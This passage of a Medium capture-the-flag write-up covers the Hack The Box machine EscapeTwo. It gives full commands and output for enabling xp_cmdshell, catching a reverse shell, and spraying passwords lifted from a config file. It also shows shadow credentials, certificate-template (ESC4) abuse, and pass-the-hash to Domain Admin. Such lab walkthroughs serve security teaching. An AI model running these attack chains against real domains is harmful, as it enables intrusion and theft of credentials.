- When you **don’t** use `--local-auth`, the SMB client tries to authenticate **against the domain controller** using domain credentials (`domain\username`), hence success only occurs if the domain credentials are valid.
- When you **do** use `--local-auth`, the tool tries authenticating against **local accounts** on the target machine (`machine_name\username`). If the target is a domain controller, local accounts are usually disabled or non-existent, leading to failures.
- In That example, without `--local-auth`, you got valid creds for a domain user `sequel.htb\oscar`, but with `--local-auth`, the same credentials failed because the local SAM database doesn’t have those users or they are disabled on the DC.

It’s time to log in as the SA user and this time, we *are* the System Administrator. That means high privileges to enable `xp_cmdshell` and snag a sweet reverse shell.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@DC01.sequel.htb'  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)  
[!] Press help for extra shell commands  
SQL (sa dbo@master)> xp_cmdshell whoami  
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.  
SQL (sa dbo@master)> enable_xp_cmdshell  
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.  
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.  
SQL (sa dbo@master)> xp_cmdshell whoami  
output  
--------------  
sequel\sql_svc  
  
NULL  
  
SQL (sa dbo@master)>
```

![](https://cdn-images-1.medium.com/max/800/1*4PWbO9-k2sPJ8lkwUHnS5A.png)

I got the reverse shell on `revshell.com`, but in a real engagement, you won’t be so lucky defenders will kick in and block that move fast. I’ve tried this before, so I switched to using Hoaxshell instead. You can also use your own custom reverse shell if you want to keep things stealthy.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nc -nlvp 1337  
listening on [any] 1337 ...  
connect to [10.10.16.91] from (UNKNOWN) [10.10.11.51] 54605  
  
PS C:\Windows\system32> whoami  
sequel\sql_svc  
PS C:\Windows\system32> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name Description State  
============================= ============================== ========  
SeChangeNotifyPrivilege Bypass traverse checking Enabled  
SeCreateGlobalPrivilege Create global objects Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled  
PS C:\Windows\system32> whoami /all  
  
USER INFORMATION  
----------------  
  
User Name SID  
============== ============================================  
sequel\sql_svc S-1-5-21-548670397-972687484-3496335370-1122  
  
  
GROUP INFORMATION  
-----------------  
  
Group Name Type SID Attributes  
========================================== ================ =============================================================== ===============================================================  
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group  
CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group  
NT SERVICE\MSSQL$SQLEXPRESS Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner  
LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group  
Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group  
SEQUEL\SQLServer2005SQLBrowserUser$DC01 Alias S-1-5-21-548670397-972687484-3496335370-1128 Mandatory group, Enabled by default, Enabled group, Local Group  
SEQUEL\SQLRUserGroupSQLEXPRESS Alias S-1-5-21-548670397-972687484-3496335370-1129 Mandatory group, Enabled by default, Enabled group, Local Group  
Mandatory Label\High Mandatory Level Label S-1-16-12288  
  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name Description State  
============================= ============================== ========  
SeChangeNotifyPrivilege Bypass traverse checking Enabled  
SeCreateGlobalPrivilege Create global objects Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled  
  
  
USER CLAIMS INFORMATION  
-----------------------  
  
User claims unknown.  
  
Kerberos support for Dynamic Access Control on this device has been disabled.  
PS C:\Windows\system32>
```

Okay, at this stage we’re live on the land. Time to figure out what privileges you have, what the environment looks like, which users and groups exist, and what’s running. You can run tools like [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS), [PrivCheck](https://github.com/itm4n/PrivescCheck), or any privilege escalation script to automate this process in a pentesting scenario. But if you’re on a red team engagement, it’s a whole different game you’ll want to stay stealthy, avoid triggering alerts, and carefully pick your moves. You might not get any LPEs right away, so patience is key before making lateral moves and pushing further.

After some surfing around the environment, we hit the jackpot found the SQL Server configuration file. Damn, damn, that’s some juicy intel right there!

```powershell
PS C:\users\sql_svc> cd ../../  
PS C:\> ls  
  
  
Directory: C:\  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
d----- 11/5/2022 12:03 PM PerfLogs  
d-r--- 1/4/2025 7:11 AM Program Files  
d----- 6/9/2024 8:37 AM Program Files (x86)  
d----- 6/8/2024 3:07 PM SQL2019  
d-r--- 6/9/2024 6:42 AM Users  
d----- 1/4/2025 8:10 AM Windows  
  
  
PS C:\> cd SQL2019  
PS C:\SQL2019> ls  
  
  
Directory: C:\SQL2019  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
d----- 1/3/2025 7:29 AM ExpressAdv_ENU  
  
  
PS C:\SQL2019> cd ExpressAdv_ENU  
PS C:\SQL2019\ExpressAdv_ENU> ls  
  
  
Directory: C:\SQL2019\ExpressAdv_ENU  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
d----- 6/8/2024 3:07 PM 1033_ENU_LP  
d----- 6/8/2024 3:07 PM redist  
d----- 6/8/2024 3:07 PM resources  
d----- 6/8/2024 3:07 PM x64  
-a---- 9/24/2019 10:03 PM 45 AUTORUN.INF  
-a---- 9/24/2019 10:03 PM 788 MEDIAINFO.XML  
-a---- 6/8/2024 3:07 PM 16 PackageId.dat  
-a---- 9/24/2019 10:03 PM 142944 SETUP.EXE  
-a---- 9/24/2019 10:03 PM 486 SETUP.EXE.CONFIG  
-a---- 6/8/2024 3:07 PM 717 sql-Configuration.INI  
-a---- 9/24/2019 10:03 PM 249448 SQLSETUPBOOTSTRAPPER.DLL  
  
  
PS C:\SQL2019\ExpressAdv_ENU>
```

```powershell
PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI  
[OPTIONS]  
ACTION="Install"  
QUIET="True"  
FEATURES=SQL  
INSTANCENAME="SQLEXPRESS"  
INSTANCEID="SQLEXPRESS"  
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"  
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"  
AGTSVCSTARTUPTYPE="Manual"  
COMMFABRICPORT="0"  
COMMFABRICNETWORKLEVEL=""0"  
COMMFABRICENCRYPTION="0"  
MATRIXCMBRICKCOMMPORT="0"  
SQLSVCSTARTUPTYPE="Automatic"  
FILESTREAMLEVEL="0"  
ENABLERANU="False"  
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"  
SQLSVCACCOUNT="SEQUEL\sql_svc"  
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"  
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"  
SECURITYMODE="SQL"  
SAPWD="MSSQLP@ssw0rd!"  
ADDCURRENTUSERASSQLADMIN="False"  
TCPENABLED="1"  
NPENABLED="1"  
BROWSERSVCSTARTUPTYPE="Automatic"  
IAcceptSQLServerLicenseTerms=True  
PS C:\SQL2019\ExpressAdv_ENU>
```

As usual, once we have any user and password, we drop them into our users and passwords files and start spraying.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc smb dc01.sequel.htb -u users -p WqSZAF6CysDQbGb3 --continue-on-success  
SMB 10.10.11.51 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\angela:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\kevin:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\sa:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [+] sequel.htb\ryan:WqSZAF6CysDQbGb3  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc smb dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3  
SMB 10.10.11.51 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.51 445 DC01 [+] sequel.htb\ryan:WqSZAF6CysDQbGb3  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc winrm dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3  
WINRM 10.10.11.51 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.11.51 5985 DC01 [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
```

And yeah, we can log in via PowerShell remoting using WinRM.

![](https://cdn-images-1.medium.com/max/800/0*24pg1UV2qThp527E.gif)

*That’s exactly how I feel Right now.*

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# evil-winrm -i dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

It’s time to map the domain with Ryan you can use SharpHound or BloodHound-python-ce. Just make sure you’re using the latest updated tools in your arsenal to get the best results.

After running BloodHound, we set Ryan as the owned user and checked for outbound object control. We saw Ryan has WriteOwner rights on the `ca_svc` user. To be honest, the first thing that comes to mind when I see WriteOwner is [ShadowCredential](https://eladshamir.com/2021/06/21/Shadow-Credentials.html) so let’s check that out.

![](https://cdn-images-1.medium.com/max/800/1*PXWjbdBqj_v_lzxcJXwCYg.png)

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Targeting user 'ca_svc'  
[*] Generating certificate  
[*] Certificate generated  
[*] Generating Key Credential  
[*] Key Credential generated with DeviceID '125bda9b-44c8-3040-edd5-667d393d5db5'  
[*] Adding Key Credential with device ID '125bda9b-44c8-3040-edd5-667d393d5db5' to the Key Credentials for 'ca_svc'  
[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

Why does this happen? Because Ryan isn’t the owner of `ca_svc`, but we can change that using `BloodyAD `or` Impacket-dacledit`.

![](https://cdn-images-1.medium.com/max/800/1*JEBxiNb2F0fxCexIlgJ2KA.png)

Now, what should we do?
 Give Ryan owner permission on `ca_svc` and add GenericAll rights to `ca_svc`.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan  
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan  
[+] ryan has now GenericAll on ca_svc
```

I used `bloodyAd `if you wann use `impacket-dacledit`

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
```

Now It’s time for Shadow credential

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Targeting user 'ca_svc'  
[*] Generating certificate  
[*] Certificate generated  
[*] Generating Key Credential  
[*] Key Credential generated with DeviceID '803b0928-01d9-8087-a144-8c84419f469c'  
[*] Adding Key Credential with device ID '803b0928-01d9-8087-a144-8c84419f469c' to the Key Credentials for 'ca_svc'  
[*] Successfully added Key Credential with device ID '803b0928-01d9-8087-a144-8c84419f469c' to the Key Credentials for 'ca_svc'  
[*] Authenticating as 'ca_svc' with the certificate  
[*] Certificate identities:  
[*] No identities found in this certificate  
[*] Using principal: 'ca_svc@sequel.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'ca_svc.ccache'  
[*] Wrote credential cache to 'ca_svc.ccache'  
[*] Trying to retrieve NT hash for 'ca_svc'  
[*] Restoring the old Key Credentials for 'ca_svc'  
[*] Successfully restored the old Key Credentials for 'ca_svc'  
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

Let’s try to validate that NT hash using `nxc`

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc smb dc01.sequel.htb -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce  
SMB 10.10.11.51 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.51 445 DC01 [+] sequel.htb\ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc winrm dc01.sequel.htb -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce  
WINRM 10.10.11.51 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.11.51 5985 DC01 [-] sequel.htb\ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce
```

As you know, one of the most important things to check is ADCS, so I’ll be using NXC and Certipy for that.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc ldap dc01.sequel.htb -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce -M adcs  
[*] Initializing LDAP protocol database  
LDAP 10.10.11.51 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)  
LDAP 10.10.11.51 389 DC01 [+] sequel.htb\ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce  
ADCS 10.10.11.51 389 DC01 [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'  
ADCS 10.10.11.51 389 DC01 Found PKI Enrollment Server: DC01.sequel.htb  
ADCS 10.10.11.51 389 DC01 Found CN: sequel-DC01-CA
```

![](https://cdn-images-1.medium.com/max/800/1*suNLGiE1uEMZqytDK2vdXg.png)

*It’s ESC4 Time Baby*

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# certipy find -vulnerable -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -stdout  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 34 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 12 enabled certificate templates  
[*] Finding issuance policies  
[*] Found 15 issuance policies  
[*] Found 0 OIDs linked to templates  
[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'  
[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[*] Enumeration output:  
Certificate Authorities  
0  
CA Name : sequel-DC01-CA  
DNS Name : DC01.sequel.htb  
Certificate Subject : CN=sequel-DC01-CA, DC=sequel, DC=htb  
Certificate Serial Number : 152DBD2D8E9C079742C0F3BFF2A211D3  
Certificate Validity Start : 2024-06-08 16:50:40+00:00  
Certificate Validity End : 2124-06-08 17:00:40+00:00  
Web Enrollment  
HTTP  
Enabled : False  
HTTPS  
Enabled : False  
User Specified SAN : Disabled  
Request Disposition : Issue  
Enforce Encryption for Requests : Enabled  
Active Policy : CertificateAuthority_MicrosoftDefault.Policy  
Permissions  
Owner : SEQUEL.HTB\Administrators  
Access Rights  
ManageCa : SEQUEL.HTB\Administrators  
SEQUEL.HTB\Domain Admins  
SEQUEL.HTB\Enterprise Admins  
ManageCertificates : SEQUEL.HTB\Administrators  
SEQUEL.HTB\Domain Admins  
SEQUEL.HTB\Enterprise Admins  
Enroll : SEQUEL.HTB\Authenticated Users  
Certificate Templates  
0  
Template Name : DunderMifflinAuthentication  
Display Name : Dunder Mifflin Authentication  
Certificate Authorities : sequel-DC01-CA  
Enabled : True  
Client Authentication : True  
Enrollment Agent : False  
Any Purpose : False  
Enrollee Supplies Subject : False  
Certificate Name Flag : SubjectAltRequireDns  
SubjectRequireCommonName  
Enrollment Flag : PublishToDs  
AutoEnrollment  
Extended Key Usage : Client Authentication  
Server Authentication  
Requires Manager Approval : False  
Requires Key Archival : False  
Authorized Signatures Required : 0  
Schema Version : 2  
Validity Period : 1000 years  
Renewal Period : 6 weeks  
Minimum RSA Key Length : 2048  
Template Created : 2025-05-24T21:15:28+00:00  
Template Last Modified : 2025-05-24T21:15:28+00:00  
Permissions  
Enrollment Permissions  
Enrollment Rights : SEQUEL.HTB\Domain Admins  
SEQUEL.HTB\Enterprise Admins  
Object Control Permissions  
Owner : SEQUEL.HTB\Enterprise Admins  
Full Control Principals : SEQUEL.HTB\Domain Admins  
SEQUEL.HTB\Enterprise Admins  
SEQUEL.HTB\Cert Publishers  
Write Owner Principals : SEQUEL.HTB\Domain Admins  
SEQUEL.HTB\Enterprise Admins  
SEQUEL.HTB\Cert Publishers  
Write Dacl Principals : SEQUEL.HTB\Domain Admins  
SEQUEL.HTB\Enterprise Admins  
SEQUEL.HTB\Cert Publishers  
Write Property Enroll : SEQUEL.HTB\Domain Admins  
SEQUEL.HTB\Enterprise Admins  
[+] User Enrollable Principals : SEQUEL.HTB\Cert Publishers  
[+] User ACL Principals : SEQUEL.HTB\Cert Publishers  
[!] Vulnerabilities  
ESC4 : User has dangerous permissions.
```

And here we go it’s ESC4! But wait… what even is ESC4?
 Before that, you might be wondering, “Why can we even pull this off with Ryan?”
 Well, the answer is simple: Ryan isn’t part of the **Cert Publishers** group but `CA_SVC` is. 😏

back to what is ESC4 is

> ESC4 is a critical misconfiguration in Active Directory Certificate Services (ADCS) where insecure permissions on certificate templates such as Write, GenericAll, or WriteDACL allow attackers to modify those templates and enable dangerous settings like Client Authentication EKUs. Once a template is misconfigured, an attacker can request certificates impersonating privileged users or systems (like Domain Admins or Domain Controllers) and authenticate using Kerberos PKINIT. This effectively lets the attacker forge trusted identities and gain high-level access, making ESC4 a direct and stealthy path to full domain compromise.

### 🔥 Exploitation

Like I said earlier **stay updated, and keep your toolkit sharp**. I used [**uv**](https://github.com/astral-sh/uv), the fast Rust-based Python package manager, to manage and update my tools. That includes `Certipy`, which I upgraded to[ **version 5**](https://github.com/ly4k/Certipy/discussions/270) for better performance and compatibility. Here's how you can deal [with ](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/)[**ESC4** ](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking)using **Certipy 5**:

With the `template` subcommand in `certipy `I edited the `DunderMifflinAuthentication` template and then **requested** a **certificate **for administrator, certipy did its thing and dropped the` .pfx` file in my current directory

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -no-save  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.  
[!] Use -debug to print a stacktrace  
[*] Updating certificate template 'DunderMifflinAuthentication'  
[*] Replacing:  
[*] nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'  
[*] flags: 66104  
[*] pKIDefaultKeySpec: 2  
[*] pKIKeyUsage: b'\x86\x00'  
[*] pKIMaxIssuingDepth: -1  
[*] pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']  
[*] pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'  
[*] pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']  
[*] pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']  
[*] msPKI-Enrollment-Flag: 0  
[*] msPKI-Private-Key-Flag: 16  
[*] msPKI-Certificate-Name-Flag: 1  
[*] msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']  
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y  
[*] Successfully updated 'DunderMifflinAuthentication'  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.  
[!] Use -debug to print a stacktrace  
[*] Requesting certificate via RPC  
[*] Request ID is 17  
[*] Successfully requested certificate  
[*] Got certificate with UPN 'administrator@sequel.htb'  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx'  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*] SAN UPN: 'administrator@sequel.htb'  
[*] Using principal: 'administrator@sequel.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'administrator.ccache'  
[*] Wrote credential cache to 'administrator.ccache'  
[*] Trying to retrieve NT hash for 'administrator'  
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# evil-winrm -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i dc01.sequel.htb  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

![](https://cdn-images-1.medium.com/max/800/1*THkOkvggpOdrS8XfME2xYQ.png)

*flowchartshowing the full exploitation chain ofESC4 using Certipy v5, from template abuse to shell. It mirrors your commands and steps exactly*

**And boom we’re Domain Admin now 😎.**
 I hope I explained the concept clearly and you had some fun reading this write-up. If you’re hungry for more, I highly recommend checking out my other ADCS write-ups I’ve dropped tons of resources there, including talks, articles, and cool tools. I also cover things like password spraying with proper OPSEC in mind. You’ll definitely find something useful to level up your game.

---

#### 🧹 Cleanup Process (Why and How)

As penetration testers especially during red team engagements **cleaning up after ourselves **is not just good etiquette, it’s crucial OPSEC. Leaving artifacts such as certificate modifications, temp files, or persistence mechanisms like **Shadow Credentials** can compromise the entire operation, alert blue teams, or even get your access revoked.

**In this scenario**, since we exploited **ESC4 (Certificate Template Write Abuse)** using `Certipy`, we must undo changes made to the CA template or AD objects. Specifically, we **wrote a new certificate configuration** to the `DunderMifflinAuthentication` template using `write-configuration`.

Now, if we want to clean up this operation, we should **revert the template to its original state** or remove our rogue config.

#### Certipy ESC4 Cleanup Command

Based on the image you’ve shown, if you had pushed a malicious template config like this:

```bash
certipy template -u ca_svc@sequel.htb -hashes <NTLM> -template DunderMifflinAuthentication -write-configuration original_template.json
```

You’d use **the same command**, but this time with the **original backed-up configuration file:**

```bash
certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-configuration original_template_backup.json
```

Make sure:

- `original_template_backup.json` is the **unmodified** version you backed up before writing the config.

![](https://cdn-images-1.medium.com/max/800/0*r-3-rphqKwclH_co.gif)

*see you sooon*

> Made with love (and shell access) by Mohamed Eletreby ❤️‍🔥

---

### Wanna Keep in Touch with Maverick?

![](https://cdn-images-1.medium.com/max/800/0*NPEo4m5xBUQSVnLG.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

By Mohamed Eletreby on May 24, 2025.

Canonical link

Exported from Medium on April 20, 2026.